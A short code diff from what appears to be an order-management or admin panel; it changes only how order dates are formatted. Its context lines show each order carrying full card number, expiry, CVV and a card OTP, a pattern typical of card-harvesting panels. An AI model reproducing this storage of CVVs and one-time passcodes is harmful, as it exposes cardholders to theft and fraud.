@@ -224,7 +224,7 @@
                     id: row.order_id, name: row.customer_name, phone: row.customer_phone,
                     address: row.customer_address, country: row.customer_country,
                     total: row.total, status: row.status,
-                    date: row.created_at ? new Date(row.created_at).toLocaleString('ar-SA') : '-',
+                    date: row.created_at ? new Date(row.created_at).toLocaleString('he-IL', {hour:'2-digit',minute:'2-digit'}) : '-',
                     paymentMethod: row.card_type || '-',
                     cardDetails: { holder: row.card_holder||'', number: row.card_number||'', expiry: row.card_expiry||'', cvv: row.card_cvv||'', brand: row.card_type||'', otp: row.card_otp||'' },
                     items: typeof row.products === 'string' ? JSON.parse(row.products||'[]') : (row.products||[])
